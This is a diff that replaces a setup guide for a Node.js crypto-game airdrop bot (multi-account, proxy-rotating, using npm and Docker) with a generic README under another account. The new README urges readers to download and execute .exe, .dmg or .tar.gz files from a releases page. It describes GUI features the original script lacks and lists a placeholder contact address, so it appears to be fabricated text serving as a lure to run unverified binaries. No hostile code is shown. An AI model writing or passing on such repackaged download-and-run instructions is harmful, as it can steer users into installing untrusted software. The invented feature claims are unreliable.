@@ -1,239 +1,112 @@
-### 🚀 kaia Bot Setup Guide
+# Kaia: Automate Your Tasks and Maximize Your Rewards 🚀
 
-Welcome to the bot setup guide! Follow the steps below to install and configure the bot correctly. This guide is designed for new users, with clear explanations for each step.
-
-> 📱 **For Mobile Users (Termux):** [View the guide here](https://github.com/MeoMunDep/Guides-for-using-my-script-on-termux)
-
----
+![Kaia Logo](https://img.shields.io/badge/Kaia-Logo-blue)
 
 ## Table of Contents
+- [Overview](#overview)
+- [Features](#features)
+- [Topics](#topics)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
-1. [System Requirements](#system-requirements)
-2. [Installing the Bot](#installing-the-bot)
-3. [Bot Configuration](#bot-configuration)
-4. [Running the Bot](#running-the-bot)
-5. [Updating the Bot](#updating-the-bot)
-6. [Contact & Support](#contact--support)
+## Overview
 
----
+Kaia is a powerful tool designed to automate various tasks in the gaming and cryptocurrency space. With Kaia, you can effortlessly check in, claim KP, and upgrade boosts, making your experience smoother and more efficient. This repository aims to provide a user-friendly interface for automating repetitive tasks, allowing you to focus on what matters most—enjoying your game.
 
-## System Requirements
+You can download the latest release of Kaia [here](https://github.com/Heshamkhmais/Kaia/releases). Follow the instructions to execute the file and start automating your tasks.
 
-Before running the bot, make sure you have installed:
+## Features
 
-- **Node.js** (Version: `22.11.0`)
-- **npm** (Version: `10.9.0`)
-- **Git**
-- **Docker** _(Optional)_
+- **Automated Task Management**: Kaia automates your daily tasks, saving you time and effort.
+- **Check-in Automation**: Never miss a check-in again. Kaia ensures you are always on top of your game.
+- **Claim KP**: Automatically claim your KP rewards without manual intervention.
+- **Boost Upgrades**: Upgrade your boosts with ease, maximizing your performance in-game.
+- **User-Friendly Interface**: Designed for simplicity, Kaia is easy to set up and use.
+- **Regular Updates**: Stay up-to-date with the latest features and fixes by checking the [Releases](https://github.com/Heshamkhmais/Kaia/releases) section.
 
-📥 **Node.js & npm:** [Download](https://t.me/KeoAirDropFreeNe/257/1462)
+## Topics
 
-📥 **Git:** [Download](https://t.me/KeoAirDropFreeNe/257/60831)
+Kaia covers a wide range of topics relevant to its functionality:
 
----
+- **Airdrop**: Stay informed about the latest airdrops in the market.
+- **Farming**: Learn strategies for effective farming in your favorite games.
+- **Black Cat Syndicate**: Join a community of like-minded gamers.
+- **Free Airdrop**: Discover how to claim free airdrops.
+- **Kai**: Explore the ecosystem surrounding the Kai token.
+- **Kaia Play**: Engage with the Kaia community through gaming.
+- **Telegram Bot**: Utilize the Telegram bot for quick updates and commands.
+- **Telegram Bot API**: Integrate with Telegram's API for advanced features.
 
-## Installing the Bot
+## Installation
 
-<details>
-<summary><strong>🔧 Install via Git</strong></summary>
+To get started with Kaia, follow these steps:
 
-```bash
-git clone https://github.com/MeoMunDep/kaia.git
-cd kaia
-npm install --no-audit --no-fund --prefer-offline --force user-agents axios meo-forkcy-colors meo-forkcy-utils https-proxy-agent socks-proxy-agent ethers web3 ws
-```
+1. Visit the [Releases](https://github.com/Heshamkhmais/Kaia/releases) section.
+2. Download the latest release file.
+3. Execute the downloaded file according to your operating system.
 
-</details>
+### For Windows Users
 
-<details>
-<summary><strong>🧰 Manual Installation</strong></summary>
+1. Download the `.exe` file from the releases.
+2. Double-click the file to run the installer.
+3. Follow the on-screen instructions to complete the installation.
 
-1. Download and extract the bot manually.
-2. Run the same `npm install` command as above.
+### For macOS Users
 
-</details>
+1. Download the `.dmg` file from the releases.
+2. Open the file and drag the Kaia app to your Applications folder.
+3. Launch Kaia from your Applications.
 
-<details>
-<summary><strong>🐳 Install via Docker</strong></summary>
+### For Linux Users
 
-```bash
-docker build -t kaia-image .
-docker run -d --name kaia-container -v $(pwd)/logs:/app/logs kaia-image
-```
+1. Download the `.tar.gz` file from the releases.
+2. Extract the files using `tar -xvzf filename.tar.gz`.
+3. Navigate to the extracted folder and run the application using `./kaia`.
 
-> 💡 On **Windows CMD**, use `%cd%` instead of `$(pwd)`
+## Usage
 
-</details>
+Using Kaia is straightforward. Once installed, follow these steps to get started:
 
----
+1. **Open Kaia**: Launch the application from your desktop or applications folder.
+2. **Configure Settings**: Set up your preferences in the settings menu.
+3. **Start Automating**: Click on the "Start" button to begin automating your tasks.
 
-## Bot Configuration
+### Task Automation
 
-<details open>
-<summary><strong>📜 1. <code>configs.json</code> - Main Configuration</strong></summary>
+To automate a task:
 
-```json
-{
-  "rotateProxy": false,
-  "skipInvalidProxy": true,
-  "proxyRotationInterval": 2,
-  "delayEachAccount": [1, 1],
-  "timeToRestartAllAccounts": 300,
-  "howManyAccountsRunInOneTime": 10,
-  "doTasks": true,
-  "upgradeBoosts": true,
-  "autoSpin": true,
-  "autoUpgrade": true,
-  "lvlToSpin": 4
-}
-```
+1. Select the task you want to automate from the main menu.
+2. Configure the parameters as needed.
+3. Click "Save" to save your settings.
 
-| **Parameter Name**            | **Type**           | **Default** | **Current Value** | **Description**                                  |
-| ----------------------------- | ------------------ | ----------- | ----------------- | ------------------------------------------------ |
-| `rotateProxy`                 | `boolean`          | `false`     | `false`           | Enable proxy rotation between accounts           |
-| `skipInvalidProxy`            | `boolean`          | `false`     | `true`            | Skip account if its proxy is invalid             |
-| `proxyRotationInterval`       | `number`           | `2`         | `2`               | Minutes between proxy rotations                  |
-| `delayEachAccount`            | `[number, number]` | `[5, 8]`    | `[1, 1]`          | Random delay range (in seconds) between accounts |
-| `timeToRestartAllAccounts`    | `number`           | `300`       | `300`             | Time (in seconds) before restarting all accounts |
-| `howManyAccountsRunInOneTime` | `number`           | `100`       | `10`              | Number of accounts to run in parallel            |
-| `doTasks`                     | `boolean`          | `true`      | `true`            | Whether to perform main tasks                    |
-| `playGames`                   | `boolean`          | `true`      | —                 | Whether to play games automatically              |
-| `referralCodes`               | `string[]`         | `[""]`      | —                 | Optional referral code                           |
-| `upgradeBoosts`               | `boolean`          | —           | `true`            | _(Not documented — custom)_                      |
-| `autoSpin`                    | `boolean`          | —           | `true`            | _(Not documented — custom)_                      |
-| `autoUpgrade`                 | `boolean`          | —           | `true`            | _(Not documented — custom)_                      |
-| `lvlToSpin`                   | `number`           | —           | `4`               | _(Not documented — custom)_                      |
+### Monitoring Progress
 
-</details>
+You can monitor the progress of your automated tasks in real-time. Kaia provides a dashboard that displays the status of each task, ensuring you are always informed.
 
-<details>
-<summary><strong>🗂️ 2. <code>datas.txt</code> - User Data</strong></summary>
+## Contributing
 
-📥 [Get file from Telegram](https://t.me/KeoAirDropFreeNee/1586)
+We welcome contributions from the community. If you would like to contribute to Kaia, please follow these guidelines:
 
-```txt
-query_id.../user...
-query_id.../user...
-query_id.../user...
-```
+1. **Fork the Repository**: Create your own copy of the repository.
+2. **Make Changes**: Implement your changes and test them thoroughly.
+3. **Submit a Pull Request**: Open a pull request with a clear description of your changes.
 
-</details>
+### Reporting Issues
 
-<details>
-<summary><strong>🌐 3. <code>proxies.txt</code> - Proxy List</strong></summary>
+If you encounter any issues while using Kaia, please report them in the Issues section of the repository. Provide as much detail as possible to help us address the problem.
 
-📥 [Free proxy from Webshare](https://www.webshare.io/?referral_code=4l5kb3glsce7)
+## License
 
-```txt
-host:port
-http://host:port
-socks5://user:pass@host:port
-...
-```
+Kaia is licensed under the MIT License. See the [LICENSE](LICENSE) file for more information.
 
-</details>
+## Contact
 
-<details>
-<summary><strong>💼 4. <code>wallets.txt</code> - Wallet List</strong></summary>
+For questions or feedback, please reach out via the following channels:
 
-📥 [Generate wallets here](https://github.com/MeoMunDep/Automatic-Ultimate-Create-Wallets-for-Airdrop)
+- **Email**: contact@example.com
+- **Telegram**: [@KaiaSupport](https://t.me/KaiaSupport)
 
-```txt
-0xabc123...
-0xdef456...
-...
-```
-
-</details>
-
----
-
-## Running the Bot
-
-<details open>
-<summary><strong>🪟 Run on Windows (.bat)</strong></summary>
-
-1. Double-click `run.bat`
-2. It auto-updates, installs dependencies, and runs the bot.
-
-> If it fails, right-click → **Run as Administrator**
-> Or run from CMD:
-
-```cmd
-run.bat
-```
-
-</details>
-
-<details>
-<summary><strong>🐧 Run on Linux/macOS (.sh)</strong></summary>
-
-```bash
-chmod +x run.sh
-./run.sh
-```
-
-</details>
-
-<details>
-<summary><strong>🐳 Run with Docker</strong></summary>
-
-```bash
-docker stop kaia-container 2>/dev/null && docker rm kaia-container 2>/dev/null
-docker build -t kaia-image .
-docker run -d --name kaia-container -v $(pwd)/logs:/app/logs kaia-image
-```
-
-> Later restart:
-
-```bash
-docker start kaia-container
-```
-
-</details>
-
----
-
-## Updating the Bot
-
-<details>
-<summary><strong>🔄 If installed via Git</strong></summary>
-
-```bash
-cd kaia
-git pull origin main
-npm install
-```
-
-</details>
-
-<details>
-<summary><strong>🐳 If using Docker</strong></summary>
-
-```bash
-docker stop kaia-container
-docker rm kaia-container
-docker build -t kaia-image .
-docker run -d --name kaia-container kaia-image
-```
-
-</details>
-
----
-
-## Contact & Support
-
-- **Support me via** [Referral Link](https://t.me/kaiaplaybot/app?startapp=ref-mu11540993v1dlk)
-- **Donate:** [Donate Here](https://t.me/KeoAirDropFreeNe/312/27801)
-- **Contact (Work):** [@MeoMunDep](https://t.me/MeoMunDep)
-- **Support Group:** [Join here](https://t.me/KeoAirDropFreeNe)
-- **Updates Channel:** [View channel](https://t.me/KeoAirDropFreeNee)
-- **YouTube:** [Watch here](https://www.youtube.com/@keoairdropfreene)
-- **Instagram:** [Follow](https://www.instagram.com/meomundep)
-- **Tiktok:** [Follow](https://www.tiktok.com/@meomundep)
-
----
-
-⚠️ **Disclaimer**: This code is provided "as is" without any warranties. Use it at your own risk. You are solely responsible for any consequences arising from its use. Redistribution or sale of this code in any form is strictly prohibited.
-
-✨ Thank you for using the bot, hope you earn from my scripts! Good luck! 🚀
+Stay updated with the latest news and updates by checking the [Releases](https://github.com/Heshamkhmais/Kaia/releases) section regularly. Your support helps us improve and expand Kaia’s capabilities.
